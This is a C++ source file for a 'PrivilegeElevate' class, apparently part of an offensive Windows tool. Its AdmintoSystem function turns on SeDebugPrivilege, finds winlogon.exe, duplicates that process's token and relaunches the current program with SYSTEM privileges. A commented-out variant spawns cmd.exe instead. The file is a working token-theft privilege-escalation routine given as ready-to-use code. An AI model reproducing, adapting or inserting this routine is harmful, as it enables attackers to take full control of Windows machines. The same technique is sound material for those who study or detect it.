#include "PrivilegeElevate.h"
#include "API.h"

bool PrivilegeElevate::UsertoAdmin() {
	bool ret = true;

	return ret;
}

bool PrivilegeElevate::AdmintoSystem() {
	bool ret = true;

	API api;
	HANDLE hCurrentToken;
	api.ZwOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,
		&hCurrentToken);
	LUID luid;
	LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid);
	TOKEN_PRIVILEGES PrivToken;
	PrivToken.PrivilegeCount = 1;
	PrivToken.Privileges[0].Luid = luid;
	PrivToken.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hCurrentToken, FALSE, &PrivToken,
		sizeof(TOKEN_PRIVILEGES), NULL, NULL);

	ULONG bufferSize;
	PVOID buffer;
	NTSTATUS status = api.ZwQuerySystemInformation(SystemProcessInformation,
		nullptr, 0, &bufferSize);
	if (!NT_SUCCESS(status)) {
		ret = false;
	}

	buffer = malloc(bufferSize * 2);

	status = api.ZwQuerySystemInformation(SystemProcessInformation, buffer,
		bufferSize * 2, nullptr);
	if (!NT_SUCCESS(status)) {
		ret = false;
	}

	PSYSTEM_PROCESS_INFORMATION sysInfo =
		reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(buffer);
	// free(buffer);

	std::wstring processName;
	ULONG processPid;
	while (true) {
		if (sysInfo->ImageName.Buffer) {
			processName = sysInfo->ImageName.Buffer;
		}

		if (processName == L"winlogon.exe") {
			processPid = HandleToULong(sysInfo->UniqueProcessId);
			break;
		}

		if (sysInfo->NextEntryOffset == 0) {
			ret = false;
		}

		sysInfo = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(
			(PUCHAR)sysInfo + sysInfo->NextEntryOffset);
	}

	HANDLE hProcess;
	OBJECT_ATTRIBUTES obj;
	InitializeObjectAttributes(&obj, NULL, NULL, NULL, NULL);
	CLIENT_ID client_id = {};
	client_id.UniqueProcess = ULongToHandle(processPid);
	status = api.ZwOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &obj,
		&client_id);
	if (!NT_SUCCESS(status)) {
		ret = false;
	}

	HANDLE hToken;
	status = api.ZwOpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken);
	if (!NT_SUCCESS(status)) {
		ret = false;
	}

	HANDLE hDpToken;
	status = api.ZwDuplicateToken(hToken, TOKEN_ALL_ACCESS, NULL,
		SecurityImpersonation, TokenPrimary, &hDpToken);

	STARTUPINFOW startupInfo = { 0 };
	startupInfo.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION processInfo = { 0 };
	//CreateProcessWithTokenW(hDpToken, LOGON_WITH_PROFILE,
	//	L"C:\\Windows\\system32\\cmd.exe",
	//	const_cast<LPWSTR>(L"/k whoami"), 0, NULL, NULL,
	//	&startupInfo, &processInfo);

	WCHAR lpCurPath[MAX_PATH];
	ret = GetModuleFileNameW(NULL, lpCurPath, MAX_PATH);

	CreateProcessWithTokenW(hDpToken, LOGON_WITH_PROFILE,
		lpCurPath,
		NULL, 0, NULL, NULL,
		&startupInfo, &processInfo);

	CloseHandle(hDpToken);
	CloseHandle(hToken);
	CloseHandle(hProcess);
	free(buffer);
	CloseHandle(hCurrentToken);

	return ret;
}
